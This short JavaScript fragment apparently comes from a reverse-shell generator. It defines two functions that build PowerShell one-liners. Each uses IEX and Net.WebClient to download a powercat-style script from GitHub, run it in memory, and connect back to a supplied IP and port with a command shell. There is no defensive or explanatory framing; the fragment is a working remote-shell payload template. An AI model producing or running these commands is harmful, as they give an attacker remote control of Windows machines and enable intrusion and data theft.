...
const powercat = (ip, port, command) => `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/epiclion.ps1'); epiclion -c ${ip} -p ${port} -e ${command}`;
const powercat2 = (ip, port, command) => `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/pwrct.ps1'); Main @('${ip}',$False,${port},60) @('${command}')`;
